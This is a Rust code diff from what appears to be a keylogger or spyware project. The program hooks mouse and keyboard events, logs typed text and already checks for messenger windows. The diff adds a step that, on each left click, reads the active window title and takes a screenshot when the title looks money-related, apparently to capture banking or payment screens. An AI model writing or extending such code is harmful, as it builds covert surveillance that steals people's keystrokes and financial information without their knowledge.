@@ -3,7 +3,7 @@ use active_win_pos_rs::get_active_window;
 use chrono::{Utc, DateTime};
 use rdev::{Event, EventType, Button};
 
-use crate::{zip_screenshot, zip_text, is_messengers};
+use crate::{zip_screenshot, zip_text, is_messengers, is_money, capture_screen};
 use crate::{LOG_FILE, LOGGED};
 use crate::AppResult;
 
@@ -82,14 +82,14 @@ pub fn callback(event: Event) {
             Button::Left => {
                 println!("User clicked mouse left button");
                 let _ = save_text();
+                let active_window = get_active_window().unwrap();
+                if is_money(active_window.title) {
+                    capture_screen();
+                }
             },
-            Button::Right => {
-
-            },
-            _ => {}
+            Button::Right => (),
+            _ => ()
         }
-        _ => {
-
-        }
+        _ => ()
     }
 }
